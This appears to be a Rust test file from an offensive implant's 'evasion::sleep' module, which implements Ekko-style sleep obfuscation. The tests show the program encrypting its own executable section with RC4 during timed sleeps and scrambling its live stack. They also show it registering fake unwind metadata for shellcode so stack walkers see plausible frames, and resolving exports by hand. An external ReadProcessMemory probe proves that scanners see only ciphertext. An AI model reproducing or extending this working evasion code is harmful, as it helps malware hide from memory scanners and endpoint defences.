                THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_QUERY_INFORMATION,
                0,
                tid,
            );
            assert!(!thread.is_null(), "OpenThread on the sleeper failed");

            let mut images: Vec<usize> = Vec::new();
            let mut caught = false;
            let deadline = std::time::Instant::now() + Duration::from_secs(6);
            while std::time::Instant::now() < deadline {
                assert_ne!(suspend(thread), u32::MAX, "SuspendThread failed");
                let mut context: unwind::Context = std::mem::zeroed();
                context.context_flags = 0x1_0003;
                let got = get_context(thread, &mut context);
                let encrypted = hash_region(buffer, LEN) != plaintext;
                if got == 1 && encrypted {
                    caught = true;
                    eprintln!(
                        "dormant capture: rip={:#x} (code page {code_page:#x})",
                        context.rip
                    );
                    let mut walk = context;
                    for _ in 0..64 {
                        let Some((image, entry)) = unwind::lookup(walk.rip as usize) else {
                            break;
                        };
                        images.push(image);
                        unwind::virtual_unwind(entry, image, &mut walk);
                        if walk.rip == 0 {
                            break;
                        }
                    }
                    resume(thread);
                    break;
                }
                resume(thread);
                std::thread::sleep(Duration::from_millis(25));
            }
            close(thread);
            assert!(caught, "never observed the encrypted dormant window");
            eprintln!("dormant images: {images:#x?}");

            let wide: Vec<u16> = "kernel32.dll"
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();
            #[allow(non_snake_case)]
            extern "system" {
                fn GetModuleHandleW(name: *const u16) -> *mut c_void;
            }
            let kernel32 = GetModuleHandleW(wide.as_ptr()) as usize;
            let exe = GetModuleHandleW(std::ptr::null()) as usize;
            let ntdll = {
                let wide: Vec<u16> = "ntdll.dll"
                    .encode_utf16()
                    .chain(std::iter::once(0))
                    .collect();
                GetModuleHandleW(wide.as_ptr()) as usize
            };
            assert!(
                images.contains(&code_page),
                "stack never crossed the T008-registered private page"
            );
            assert!(
                images.contains(&exe),
                "stack never reached the owning image's frames"
            );
            assert!(images.contains(&kernel32), "no kernel32 frame");
            assert!(images.contains(&ntdll), "no ntdll frame");
        }
        sleeper.join().expect("sleeper panicked");
    }

    #[test]
    fn system_function032_roundtrips_via_thunk() {
        let ekko = unsafe { EkkoSleep::new() }.expect("ekko setup");
        let original = *b"controlled-rc4-buffer-for-ekko";
        let mut data = original;
        let key = *b"fixed-test-key!!";
        let data_ustr = Ustring {
            length: data.len() as u32,
            maximum_length: data.len() as u32,
            buffer: data.as_mut_ptr() as usize,
        };
        let key_ustr = Ustring {
            length: key.len() as u32,
            maximum_length: key.len() as u32,
            buffer: key.as_ptr() as usize,
        };
        let context = [
            &data_ustr as *const Ustring as usize,
            &key_ustr as *const Ustring as usize,
            0,
            0,
            ekko.system_function032,
        ];
        let thunk: unsafe extern "system" fn(*const usize) =
            unsafe { std::mem::transmute(ekko.thunk) };

        unsafe { thunk(context.as_ptr()) };
        assert_ne!(data, original, "first RC4 call did not transform data");
        unsafe { thunk(context.as_ptr()) };
        assert_eq!(data, original, "second RC4 call did not restore data");
    }

    #[test]
    fn compare_walk_with_getprocaddress() {
        #[allow(non_snake_case)]
        extern "system" {
            fn GetModuleHandleW(name: *const u16) -> *mut std::ffi::c_void;
            fn GetProcAddress(
                module: *mut std::ffi::c_void,
                name: *const i8,
            ) -> *const std::ffi::c_void;
        }
        unsafe {
            let wide: Vec<u16> = "kernel32.dll"
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();
            let base = GetModuleHandleW(wide.as_ptr());
            for name in [
                "GetCurrentThreadStackLimits",
                "LoadLibraryA",
                "CreateEventW",
                "SetWaitableTimer",
                "VirtualProtect",
                "OpenProcess",
                "ReadProcessMemory",
                "CreateWaitableTimerW",
            ] {
                let mine = syscalls::export_address("kernel32.dll", name);
                let cname = std::ffi::CString::new(name).unwrap();
                let gpa = GetProcAddress(base, cname.as_ptr()) as usize;
                assert_eq!(mine, Some(gpa), "manual export mismatch for {name}");
            }
        }
    }

    #[test]
    fn erase_stack_unit() {
        erase_dead_stack();
    }

    // External memory scanner used as the encryption proof: a separate
    // process reading the parent test's memory with ReadProcessMemory,
    // because an in-process observer would execute the (temporarily RW,
    // encrypted) image it is trying to read.
    #[test]
    #[ignore = "helper process for ekko_encrypts_during_sleep_and_restores"]
    fn ekko_probe_child() {
        let Ok(pid) = std::env::var("ABRAHAM_PROBE_PID") else {
            eprintln!("probe child: ABRAHAM_PROBE_PID not set, nothing to do");
            return;
        };
        let addr = std::env::var("ABRAHAM_PROBE_ADDR").unwrap();
        let len: usize = std::env::var("ABRAHAM_PROBE_LEN").unwrap().parse().unwrap();
        unsafe {
            let open: extern "system" fn(u32, i32, u32) -> *mut c_void = std::mem::transmute(
                syscalls::export_address("kernel32.dll", "OpenProcess").unwrap(),
            );
            let read_mem: extern "system" fn(
                *mut c_void,
                *const c_void,
                *mut c_void,
                usize,
                *mut usize,
            ) -> i32 = std::mem::transmute(
                syscalls::export_address("kernel32.dll", "ReadProcessMemory").unwrap(),
            );
            let process = open(0x0410, 0, pid.parse::<u32>().unwrap());
            assert!(!process.is_null(), "OpenProcess on parent failed");
            let target = addr.parse::<usize>().unwrap();
            let mut snapshot = vec![0u8; len];
            let mut read = 0usize;
            let ok = read_mem(
                process,
                target as _,
                snapshot.as_mut_ptr() as _,
                len,
                &mut read,
            );
            assert_eq!(ok, 1, "reference ReadProcessMemory failed");
            let deadline = std::time::Instant::now() + Duration::from_secs(5);
            let mut sample = vec![0u8; len];
            while std::time::Instant::now() < deadline {
                let ok = read_mem(
                    process,
                    target as _,
                    sample.as_mut_ptr() as _,
                    len,
                    &mut read,
                );
                if ok == 1 && sample != snapshot {
                    println!("EKKO_SCRAMBLED_SEEN");
                    return;
                }
                std::thread::sleep(Duration::from_millis(20));
            }
            panic!("probe never observed encrypted bytes");
        }
    }

    #[test]
    #[ignore = "encrypts the live .text of this test binary; run with --test-threads=1"]
    fn ekko_encrypts_during_sleep_and_restores() {
        let ekko = unsafe { EkkoSleep::new() }.expect("ekko setup");
        let (base, len) = unsafe { syscalls::executable_section() }.unwrap();
        let before = hash_region(base, len);
        let probe = Command::new(std::env::current_exe().unwrap())
            .args([
                "evasion::sleep::tests::ekko_probe_child",
                "--exact",
                "--ignored",
                "--nocapture",
            ])
            .env("ABRAHAM_PROBE_PID", std::process::id().to_string())
            .env("ABRAHAM_PROBE_ADDR", base.to_string())
            .env("ABRAHAM_PROBE_LEN", "2048")
            .stdout(std::process::Stdio::piped())
            .spawn()
            .expect("probe spawn");
        // Give the probe time to snapshot the plaintext reference.
        std::thread::sleep(Duration::from_millis(600));
        ekko.sleep(Duration::from_millis(1500))
            .expect("ekko sleep cycle");
        let output = probe.wait_with_output().expect("probe join");
        assert!(
            String::from_utf8_lossy(&output.stdout).contains("EKKO_SCRAMBLED_SEEN"),
            "external probe never saw encrypted bytes"
        );
        assert_eq!(hash_region(base, len), before, "image not restored");
    }

    /// The unwind programs registered in `with_text` describe byte offsets
    /// of the two shellcode blobs; if either blob is ever reassembled this
    /// trips so the metadata gets rederived instead of silently lying to
    /// stack walkers.
    #[test]
    fn shellcode_prolog_offsets_match_unwind_programs() {
        // trampoline: `sub rsp,0x28` at 19..23
        assert_eq!(&TRAMPOLINE[19..23], &[0x48, 0x83, 0xEC, 0x28]);
        // wait loop: push rbx / rsi / rdi / r12 then `sub rsp,0x28` at 5..9
        assert_eq!(
            &WAIT_LOOP[0..9],
            &[0x53, 0x56, 0x57, 0x41, 0x54, 0x48, 0x83, 0xEC, 0x28]
        );
    }

    #[test]
    fn thunk_page_has_registered_unwind_metadata() {
        let ekko = unsafe { EkkoSleep::new() }.expect("ekko setup");
        let code_page = ekko.thunk; // trampoline sits at offset 0
        for pc in [
            ekko.thunk,
            ekko.thunk + 25,
            ekko.wait_loop,
            ekko.wait_loop + 10,
        ] {
            let (image, _) =
                unwind::lookup(pc).unwrap_or_else(|| panic!("no unwind entry for {pc:#x}"));
            assert_eq!(
                image, code_page,
                "entry for {pc:#x} resolved to a foreign image"
            );
        }
    }

    /// Regression tripwire for the arena staging: a complete APC cycle
    /// (protect RW, RC4, decrypt, protect RX, wake) against a private
    /// buffer. Runs in the regular suite — including release, in parallel —
    /// because it never touches the test image's executable section. If the
    /// key/USTRING/protection-out staging ever moves back to stack slots,
    /// optimized builds clobber them mid-wait and this fails.
    #[test]
    fn ekko_cycle_roundtrip_on_private_buffer() {
        const LEN: usize = 0x2000;
        let buffer = unsafe { syscalls::alloc_rw(LEN) }.expect("private buffer");
        unsafe {
            for offset in 0..LEN {
                ((buffer + offset) as *mut u8).write_volatile((offset as u8) ^ 0x5A);
            }
            syscalls::protect(buffer, LEN, PAGE_EXECUTE_READ as usize).expect("buffer to RX");
        }
        let before = hash_region(buffer, LEN);
        let ekko = unsafe { EkkoSleep::with_text((buffer, LEN)) }.expect("ekko setup");
        ekko.sleep(Duration::from_millis(60)).expect("ekko cycle");
        assert_eq!(
            hash_region(buffer, LEN),
            before,
            "private buffer not restored bit-for-bit"
        );
    }

    /// Sleep 2.0: proves the LIVE stack above the APC delivery is
    /// scrambled mid-sleep and restored bit-for-bit on wake. A sibling
    /// thread sleeps with a recognizable marker in its caller frame —
    /// pushed more than STACK_CIPHER_CLEARANCE above the sleep entry by
    /// a frame-sized pad, so the geometry is deterministic — while this
    /// thread samples the marker from outside. Mid-sleep it must read
    /// as ciphertext, after the cycle it must be exactly the plaintext
    /// again.
    #[test]
    #[ignore = "real stack-cipher cycle on a sibling thread; serial only"]
    fn sleep2_scrambles_live_stack_and_restores() {
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::sync::Arc;

        const LEN: usize = 0x2000;
        let buffer = unsafe { syscalls::alloc_rw(LEN) }.expect("private buffer");
        unsafe {
            for offset in 0..LEN {
                ((buffer + offset) as *mut u8).write_volatile((offset as u8) ^ 0x5A);
            }
            syscalls::protect(buffer, LEN, PAGE_EXECUTE_READ as usize).expect("buffer to RX");
        }
        let ekko = unsafe { EkkoSleep::with_text((buffer, LEN)) }.expect("ekko setup");

        let marker_at = Arc::new(AtomicUsize::new(0));
        let marker_copy = marker_at.clone();
        // EkkoSleep carries raw handles (not Send); the one-cycle-at-a-time
        // contract is per-thread and this sleeper owns it exclusively.
        struct SendSleep(EkkoSleep);
        unsafe impl Send for SendSleep {}
        let ekko = SendSleep(ekko);
        let sleeper = std::thread::spawn(move || {
            // Bind the wrapper itself first: edition-2021 closures capture
            // precise paths, and `ekko.0` would capture the raw-pointer
            // field directly, bypassing the Send impl above.
            let wrapper = ekko;
            let ekko = wrapper.0;
            // The pad pushes the marker (and everything the sleeper's
            // caller frames hold) safely above the prefill's clearance.
            #[inline(never)]
            fn deep(ekko: &EkkoSleep, marker_at: &AtomicUsize) {
                let pad = [0x11u8; STACK_CIPHER_CLEARANCE + 0x200];
                std::hint::black_box(&pad);
                let marker = [0xA5u8; 64];
                marker_at.store(&marker as *const [u8; 64] as usize, Ordering::SeqCst);
                std::sync::atomic::fence(Ordering::SeqCst);
                ekko.sleep(Duration::from_millis(1500))
                    .expect("sleep cycle");
                assert_eq!(marker, [0xA5u8; 64], "marker not restored after the cycle");
            }
            deep(&ekko, &marker_copy);
        });

        // Wait until the sleeper publishes, then sample inside the sleep
        // window (well after the +150ms stack-encrypt stage).
        let deadline = std::time::Instant::now() + Duration::from_secs(2);
        let addr = loop {
            let addr = marker_at.load(Ordering::SeqCst);
            if addr != 0 {
                break addr;
            }
            assert!(
                std::time::Instant::now() < deadline,
                "sleeper never published"
            );
            std::thread::sleep(Duration::from_millis(10));
        };
        std::thread::sleep(Duration::from_millis(700));
        let mid: [u8; 64] = unsafe { std::ptr::read_volatile(addr as *const [u8; 64]) };
        assert_ne!(
            mid, [0xA5u8; 64],
            "marker still plaintext mid-sleep — stack cipher missed the caller frames"
        );
        sleeper.join().expect("sleeper panicked");
    }

    /// Integrated long-run validation over a private buffer: repeated full
    /// APC cycles with a bit-for-bit integrity check after EVERY cycle.
    /// Each cycle re-arms the waitable timer — the prime suspect behind
    /// the VM's silent death after ~15-20 cycles (see
    /// `docs/lab/2026-09-10-vm-validation.md`) — so a few hundred cycles
    /// without a hang, an error or an integrity loss is the host-side
    /// regression evidence for that follow-up. Ignored by default: it is
    /// lab evidence with a wall-clock cost, not a unit property.
    #[test]
    #[ignore = "long-run lab evidence; run serially when needed"]
    fn ekko_long_run_private_buffer() {
        const CYCLES: usize = 300;
        const LEN: usize = 0x2000;
        let buffer = unsafe { syscalls::alloc_rw(LEN) }.expect("private buffer");
        unsafe {
            for offset in 0..LEN {
                ((buffer + offset) as *mut u8).write_volatile((offset as u8) ^ 0x5A);
            }
            syscalls::protect(buffer, LEN, PAGE_EXECUTE_READ as usize).expect("buffer to RX");
        }
        let before = hash_region(buffer, LEN);
        let ekko = unsafe { EkkoSleep::with_text((buffer, LEN)) }.expect("ekko setup");
        let start = std::time::Instant::now();
        for cycle in 0..CYCLES {
            ekko.sleep(Duration::from_millis(10))
                .unwrap_or_else(|e| panic!("cycle {cycle} failed: {e}"));
            assert_eq!(
                hash_region(buffer, LEN),
                before,
                "integrity lost at cycle {cycle}"
            );
        }
        let elapsed = start.elapsed();
        println!("EKKO_LONG_RUN {CYCLES} cycles in {elapsed:?}");
        // 300 cycles of (10ms sleep + full APC round trip) — generous
        // ceiling that still catches a stalled timer re-arm.
        assert!(
            elapsed < Duration::from_secs(120),
            "{CYCLES} cycles took {elapsed:?} — timer re-arm stall?"
        );
    }
}
